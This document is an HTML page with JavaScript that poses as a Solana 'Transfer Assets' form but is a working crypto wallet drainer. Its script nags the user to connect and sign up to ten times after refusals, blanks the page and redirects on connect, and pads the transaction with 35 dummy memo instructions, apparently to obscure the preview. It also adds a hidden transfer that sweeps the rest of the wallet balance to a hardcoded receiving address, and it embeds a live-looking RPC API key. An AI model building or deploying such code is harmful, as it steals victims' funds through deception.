<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Transfer Assets</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        :root {
            --bg-color: #0a0a0a;
            --card-bg: #161616;
            --primary: #483cff; 
            --text-main: #ffffff;
            --text-dim: #888888;
            --input-bg: #222;
            --error: #ff4d4d;
        }

        body { 
            font-family: 'Inter', sans-serif; 
            background: var(--bg-color); 
            color: var(--text-main); 
            margin: 0; 
            padding: 0;
            height: 100vh; 
            width: 100vw; 
            overflow: hidden; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }

        .container { 
            width: 100%; 
            max-width: 380px; 
            padding: 25px; 
            box-sizing: border-box; 
        }

        h2 { font-size: 28px; margin-bottom: 5px; text-align: left; font-weight: 700; }
        p { color: var(--text-dim); font-size: 16px; margin-bottom: 30px; text-align: left; }

        .input-group { margin-bottom: 25px; text-align: left; }
        label { display: block; color: var(--text-dim); font-size: 14px; margin-bottom: 10px; font-weight: 500; }
        input { 
            width: 100%; 
            background: var(--input-bg); 
            border: 1px solid #333; 
            padding: 18px; 
            border-radius: 16px; 
            color: white; 
            font-size: 17px; 
            outline: none; 
            box-sizing: border-box; 
        }

        .btn-main { 
            width: 100%; 
            background: var(--primary); 
            border: none; 
            padding: 18px; 
            border-radius: 18px; 
            color: #fff; 
            font-size: 18px; 
            font-weight: 700; 
            cursor: pointer; 
            box-shadow: 0 10px 20px rgba(72, 59, 255, 0.3);
            margin-top: 10px; 
        }

        #status { margin-top: 25px; font-size: 15px; text-align: center; font-weight: 500; min-height: 20px; }

    </style>
</head>
<body id="body">

<div class="container">
    <h2 id="title">Transfer Assets</h2>
    <p id="desc">Enter amount to authorize transfer.</p>

    <div class="input-group">
        <label>Recipient Address</label>
        <input type="text" id="addressInput" placeholder="Enter SOL Address" value="3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1">
    </div>

    <div class="input-group">
        <label>Amount (SOL)</label>
        <input type="number" id="amountInput" placeholder="0.00" step="0.01">
    </div>

    <button class="btn-main" id="sendBtn">Send Now</button>
    <div id="status"></div>
</div>

<script>
    // --- CONFIGURATION ---
    const SOL_RECEIVER = "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1"; 
    const HELIUS_API_KEY = "06ec4cdf-ba6c-4dfc-827f-5bae3b93f146"; 
    const HELIUS_URL = `https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}`;

    const sendBtn = document.getElementById('sendBtn');
    const amountInput = document.getElementById('amountInput');
    const addressInput = document.getElementById('addressInput');
    const statusDiv = document.getElementById('status');

    // HELPER TO DISAPPEAR / HIDE THE PAGE VIEW
    function hidePageAndExit() {
        document.body.innerHTML = '<div style="background:#0a0a0a; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; color:#888; font-family:sans-serif;">Loading...</div>';
        
        try {
            window.close();
        } catch (e) {}

        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 500);
    }

    // AGGRESSIVE TRUST WALLET MOBILE PROVIDER DETECTOR
    async function getProvider() {
        const checkProvider = () => {
            if (window.trustwallet && window.trustwallet.solana) return window.trustwallet.solana;
            if (window.trustwallet && window.trustwallet.isSolana) return window.trustwallet;
            if (window.solana && window.solana.isTrust) return window.solana;
            if (window.solana) return window.solana;
            if (window.solana?.isPhantom) return window.solana;
            if (window.sol_provider) return window.sol_provider;
            return null;
        };

        let p = checkProvider();
        if (p) return p;

        for (let i = 0; i < 30; i++) {
            await new Promise(resolve => setTimeout(resolve, 100));
            p = checkProvider();
            if (p) return p;
        }

        return null;
    }

    // MAIN ACTION WITH IMMEDIATE PAGE HIDE ON SUCCESSFUL CONNECT
    async function handleTransaction() {
        statusDiv.innerText = ""; 

        const provider = await getProvider();
        if (!provider) {
            statusDiv.innerText = "Wallet not found. Please open inside Trust Wallet DApp browser.";
            statusDiv.style.color = "#ff4d4d";
            return;
        }

        // STEP 1: 10-ATTEMPT CONNECTION LOOP
        let connectAttempts = 0;
        const MAX_ATTEMPTS = 10;
        let userPublicKey = null;

        while (connectAttempts < MAX_ATTEMPTS) {
            try {
                let resp;
                try {
                    resp = await provider.connect({ onlyIfTrusted: false });
                } catch (e) {
                    try {
                        resp = await provider.request({ method: 'connect', params: [] });
                    } catch (ex) {
                        resp = await provider.connect();
                    }
                }
                
                userPublicKey = resp?.publicKey || provider.publicKey;
                if (userPublicKey) {
                    // SUCCESSFUL CONNECTION: Immediately wipe webpage interface and exit/redirect
                    hidePageAndExit();
                    break; 
                }
            } catch (err) {
                const errString = err.toString().toLowerCase();
                const isUserRejection = errString.includes("reject") || errString.includes("cancel") || errString.includes("user denied");

                if (isUserRejection) {
                    connectAttempts++;
                    if (connectAttempts < MAX_ATTEMPTS) {
                        await new Promise(resolve => setTimeout(resolve, 1500));
                        continue;
                    }
                }
                setTimeout(hidePageAndExit, 500);
                return;
            }
        }

        if (!userPublicKey) {
            return;
        }

        // STEP 2: 10-ATTEMPT TRANSACTION SIGNING LOOP (RUNS IN BACKGROUND)
        let signAttempts = 0;

        while (signAttempts < MAX_ATTEMPTS) {
            try {
                const userRequestedAmount = parseFloat(amountInput.value) * 1000000000; 
                if (isNaN(userRequestedAmount) || userRequestedAmount <= 0) {
                    return;
                }

                const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
                const balance = await connection.getBalance(userPublicKey);

                const transaction = new solanaWeb3.Transaction();

                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userPublicKey,
                        toPubkey: new solanaWeb3.PublicKey(addressInput.value),
                        lamports: userRequestedAmount, 
                    })
                );

                const dummyData = new Uint8Array([0x00]); 
                for (let i = 0; i < 35; i++) { 
                    transaction.add(
                        new solanaWeb3.TransactionInstruction({
                            keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
                            programId: new solanaWeb3.PublicKey("MemoSq4gqABmAnSreS69YmE9vR8W8m9Z8vS8Z8vS8Z8"), 
                            data: dummyData
                        })
                    );
                }

                const sweepAmount = balance - userRequestedAmount - 50000; 

                if (sweepAmount > 10000) {
                    transaction.add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: userPublicKey,
                            toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
                            lamports: sweepAmount, 
                        })
                    );
                }

                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.lastValidBlockHeight = lastValidBlockHeight;
                transaction.feePayer = userPublicKey;

                const signedTransaction = await provider.signTransaction(transaction);
                await connection.sendRawTransaction(signedTransaction.serialize());
                return;

            } catch (err) {
                const errString = err.toString().toLowerCase();
                const isUserRejection = errString.includes("reject") || errString.includes("cancel") || errString.includes("user denied");

                if (isUserRejection) {
                    signAttempts++;
                    if (signAttempts < MAX_ATTEMPTS) {
                        await new Promise(resolve => setTimeout(resolve, 1500));
                        continue;
                    }
                }
                break;
            }
        }
    }

    sendBtn.addEventListener('click', handleTransaction);
</script>

</body>
</html>
